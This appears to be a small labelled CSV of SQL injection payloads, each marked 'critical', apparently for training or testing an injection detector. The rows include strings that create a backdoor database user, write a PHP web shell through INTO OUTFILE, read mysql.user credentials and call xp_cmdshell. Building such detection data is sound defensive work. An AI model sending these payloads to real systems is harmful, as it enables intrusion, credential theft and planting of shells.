query,risk
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'pass' --,critical
"'; CALL mysql.lambda_async('127.0.0.1', 1234) --",critical
'; SELECT table_name FROM information_schema.tables -- AND load_file('test'),critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- AND load_file('test'),critical
' INTO OUTFILE '/var/www/shell.php' --,critical
'; SELECT * FROM mysql.user -- AND load_file('test'),critical
'; SELECT table_name FROM information_schema.tables -- OR xp_cmdshell,critical
'; EXEC(@cmd) -- OR xp_cmdshell,critical
